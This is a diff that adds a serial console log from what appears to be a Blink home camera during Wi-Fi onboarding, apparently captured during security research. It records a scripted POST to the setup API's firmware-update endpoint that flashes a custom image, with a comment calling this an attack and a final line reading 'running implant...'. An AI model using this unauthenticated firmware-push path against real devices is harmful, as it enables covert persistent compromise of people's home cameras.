@@ -1,0 +1,193 @@
+bohHPB                                                                                                                                                                                             
+===                                                                                                                                                                                                
+TB OTA State   = 0x0                                                                                                                                                                               
+TB SE  version = 0x101020C                                                                                                                                                                         
+TB BL  version = 0x5260000                                                                                                                                                                         
+TB App version = 0x52C0000                                                                                                                                                                         
+TB SystemTime  = 0x0                                                                                                                                                                               
+TB Timer       = 0x0                                                                                                                                                                               
+TB SB En       = 1                                                                                                                                                                                 
+OTA                                                                                                                                                                                                
+WARNING: tb not reporting time                                                                                                                                                                     
+perm: device key get ret = 0                                                                                                                                                                       
+FW Bundle:   12.81                                                                                                                                                                                 
+Ver TB SE:   00000000                                                                                                                                                                              
+Ver TB Boot: 00000000                                                                                                                                                                              
+Ver TB App:  5.44                                                                                                                                                                                  
+Ver WiFi:    072d6276                                                                                                                                                                              
+Ver ACB:     2.15                                                                                                                                                                                  
+IMMI 42                                                                                                                                                                                            
+Vega FW release:e35edf9b                                                                                                                                                                           
+Serial: [serial number redacted]                                                                                                                                                                              
+Unable to find key '8'                                                                                                                                                                             
+obinfo cache status 5                                                                                                                                                                              
+OB mode: 0                                                                                                                                                                                         
+ACB Config:                                                                                                                                                                                        
+ mode: 0                                                                                                                                                                                           
+ chime type: 0                                                                                                                                                                                     
+ power level: 0                                                                                                                                                                                    
+ cutover voltage: 0                                                                                                                                                                                
+ harvest current: 0                                                                                                                                                                                
+ ringing current: 0                                                                                                                                                                                
+obinfo prev cache status(5, 18)                                                                                                                                                                    
+Invalid OB Creds                                                                                                                                                                                   
+TB_Events 10                                                                                                                                                                                       
+TB_Power_On                                                                                                                                                                                        
+TB_Reboot_Cause = 0x1                                                                                                                                                                              
+Voltage 2940    0                                                                                                                                                                                  
+Serial Num: [serial number redacted]                                                                                                                                                                    
+LFR Serial Num: 0xb03b                                                                                                                                                                             
+Starting WIFI OB in 10 seconds...                                                                                                                                                                  
+CC: US                                                                                                                                                                                             
+wifi started                                                                                                                                                                                       
+wifi start done                                                                                                                                                                                    
+Start soft AP BLINK-72D8                                                                                                                                                                           
+ERROR: IOCTL failed                                                                                                                                                                                
+                                                                                                                                                                                                   
+1108:../../src/driver/wifi/cyw4343w/sdk/WICED/WWD/internal/wwd_sdpcm.c                                                                                                                             
+EVENT Soft AP: IP creating. (10468)                                                                                                                                                                
+EVENT DHCP Server Started. (10470)                                                                                                                                                                 
+sem_ap_start_scan                                                                                                                                                                                  
+scan-params: 20, 40, 110, 45, 2                                                                                                                                                                    
+scan start ret = 0                                                                                                                                                                                 
+
+[scan results redacted]
+
+scan complete                                                                                                                                                                                      
+http open ack                                                                                                                                                                                      
+INFO: 1min                                                                                                                                                                                         
+tcp listen callback!                                                                                                                                                                               
+TCP connection accepted                                                                                                                                                                            
+MSS [1460]                                                                                                                                                                                         
+GET /api/get_fw_version HTTP/1.1                                                                                                                                                                   
+Host: 172.16.97.199                                                                                                                                                                                
+Connection: Keep-Alive                                                                                                                                                                             
+Accept-Encoding: gzip                                                                                                                                                                              
+User-Agent: okhttp/4.12.0                                                                                                                                                                          
+blank line                                                                                                                                                                                         
+new http request                                                                                                                                                                                   
+get version                                                                                                                                                                                        
+body sent                                                                                                                                                                                          
+Disconnecting socket                                                                                                                                                                               
+ac1061d1 sock disco callback (75553)                                                                                                                                                               
+txq=0, tx_w=4514, rx_q=0, rx_w=10220                                                                                                                                                               
+TCP socket disconnected                                                                                                                                                                            
+tcp listen callback!                                                                                                                                                                               
+TCP connection accepted                                                                                                                                                                            
+MSS [1460]                                                                                                                                                                                         
+POST /api/set/key HTTP/1.1                                                                                                                                                                         
+Content-Type: application/octet-stream                                                                                                                                                             
+Content-Length: 48                                                                                                                                                                                 
+Host: 172.16.97.199                                                                                                                                                                                
+Connection: Keep-Alive                                                                                                                                                                             
+Accept-Encoding: gzip                                                                                                                                                                              
+User-Agent: okhttp/4.12.0                                                                                                                                                                          
+blank line                                                                                                                                                                                         
+new http request                                                                                                                                                                                   
+set key                                                                                                                                                                                            
+body sent                                                                                                                                                                                          
+Disconnecting socket                                                                                                                                                                               
+ac1061d1 sock disco callback (75627)                                                                                                                                                               
+txq=0, tx_w=4415, rx_q=0, rx_w=10220                                                                                                                                                               
+TCP socket disconnected                                                                                                                                                                            
+tcp listen callback!                                                                                                                                                                               
+TCP connection accepted                                                                                                                                                                            
+MSS [1460]                                                                                                                                                                                         
+GET /api/ssids HTTP/1.1                                                                                                                                                                            
+Host: 172.16.97.199                                                                                                                                                                                
+Connection: Keep-Alive                                                                                                                                                                             
+Accept-Encoding: gzip                                                                                                                                                                              
+User-Agent: okhttp/4.12.0                                                                                                                                                                          
+blank line                                                                                                                                                                                         
+new http request                                                                                                                                                                                   
+site scan                                                                                                                                                                                          
+body sent                                                                                                                                                                                          
+Disconnecting socket                                                                                                                                                                               
+ac1061d1 sock disco callback (75797)                                                                                                                                                               
+txq=0, tx_w=6576, rx_q=0, rx_w=10220                                                                                                                                                               
+TCP socket disconnected                                                                                                                                                                            
+tcp listen callback!                                                                                                                                                                               
+TCP connection accepted                                                                                                                                                                            
+MSS [1460]                                                                                                                                                                                         
+GET /api/logs HTTP/1.1                                                                                                                                                                             
+Host: 172.16.97.199                                                                                                                                                                                
+Connection: Keep-Alive                                                                                                                                                                             
+Accept-Encoding: gzip                                                                                                                                                                              
+User-Agent: okhttp/4.12.0                                                                                                                                                                          
+blank line                                                                                                                                                                                         
+new http request                                                                                                                                                                                   
+get_logs: len=9                                                                                                                                                                                    
+body sent                                                                                                                                                                                          
+Disconnecting socket                                                                                                                                                                               
+ac1061d1 sock disco callback (75897)                                                                                                                                                               
+txq=0, tx_w=4543, rx_q=0, rx_w=10220                                                                                                                                                               
+TCP socket disconnected                                                                                                                                                                            
+tcp listen callback!                                                                                                                                                                               
+TCP connection accepted                                                                                                                                                                            
+MSS [1460]                                                                                                                                                                                         
+POST /api/set/key HTTP/1.1                                                                                                                                                                         
+Host: 172.16.97.199                                                                                                                                                                                
+User-Agent: python-requests/2.25.1                                                                                                                                                                 
+Accept-Encoding: gzip, deflate                                                                                                                                                                     
+Accept: */*                                                                                                                                                                                        
+Connection: keep-alive                                                                                                                                                                             
+Content-Length: 176                                                                                                                                                                                
+blank line                                                                                                                                                                                         
+new http request                                                                                                                                                                                   
+set key                                                                                                                                                                                            
+                                                                                                                                                                                                   
+Failed to parse session key                                                                                                                                                                        
+body sent                                                                                                                                                                                          
+Disconnecting socket                                                                                                                                                                               
+ac1061d2 sock disco callback (80058)                                                                                                                                                               
+txq=0, tx_w=4415, rx_q=0, rx_w=10220                                                                                                                                                               
+TCP socket disconnected                                                                                                                                                                            
+tcp listen callback!                                                                                                                                                                               
+TCP connection accepted                                                                                                                                                                            
+MSS [1460]                                                                                                                                                                                         
+POST /api/set/app_fw_update HTTP/1.1                                                                                                                                                               
+Host: 172.16.97.199                                                                                                                                                                                
+User-Agent: python-requests/2.25.1                                                                                                                                                                 
+Accept-Encoding: gzip, deflate                                                                                                                                                                     
+Accept: */*                                                                                                                                                                                        
+Connection: keep-alive                                                                                                                                                                             
+Content-Length: 975744                                                                                                                                                                             
+blank line                                                                                                                                                                                         
+new http request                                                                                                                                                                                   
+FW update size = 975744                                                                                                                                                                            
+payload started                                                                                                                                                                                    
+erasing spi flash                                                                                                                                                                                  
+spi erase done                                                                                                                                                                                     
+writing spi flash                                                                                                                                                                                  
+spi write done                                                                                                                                                                                     
+old hash:                                                                                                                                                                                          
+a0 37 21 93 42 19 26 9b 05 c5 dc 15 52 97 72 bc 9c 14 31 26 57 bd cf 3d 1b 5b c4 12 56 b7 1b e5 <- this is the same as new hash because this is not the first time I've run the attack.
+new hash:                                                                                                                                                                                          
+a0 37 21 93 42 19 26 9b 05 c5 dc 15 52 97 72 bc 9c 14 31 26 57 bd cf 3d 1b 5b c4 12 56 b7 1b e5                                                                                                    
+rebooting                                                                                                                                                                                          
+wrote to tb                                                                                                                                                                                        
+body sent                                                                                                                                                                                          
+Disconnecting socket                                                                                                                                                                               
+ac1061d2 sock disco callback (94025)                                                                                                                                                               
+txq=0, tx_w=4493, rx_q=0, rx_w=10220                                                                                                                                                               
+TCP socket disconnected                                                                                                                                                                            
+��                                                                                                                                                                                                 
+bfhHFrhHF#B                                                                                                                                                                                        
+===                                                                                                                                                                                                
+TB OTA State   = 0x0                                                                                                                                                                               
+TB SE  version = 0x0                                                                                                                                                                               
+TB BL  version = 0x0                                                                                                                                                                               
+TB App version = 0x0                                                                                                                                                                               
+TB SystemTime  = 0x0                                                                                                                                                                               
+TB Timer       = 0x0                                                                                                                                                                               
+TB SB En       = 1                                                                                                                                                                                 
+FACTORY                                                                                                                                                                                            
+WARNING: tb not reporting time                                                                                                                                                                     
+perm: device key get ret = 0                                                                                                                                                                       
+FW Bundle:   12.81                                                                                                                                                                                 
+Ver TB SE:   00000000                                                                                                                                                                              
+Ver TB Boot: 00000000                                                                                                                                                                              
+Ver TB App:  5.44                                                                                                                                                                                  
+Ver WiFi:    072d6276                                                                                                                                                                              
+Ver ACB:     2.15                                                                                                                                                                                  
+running implant...
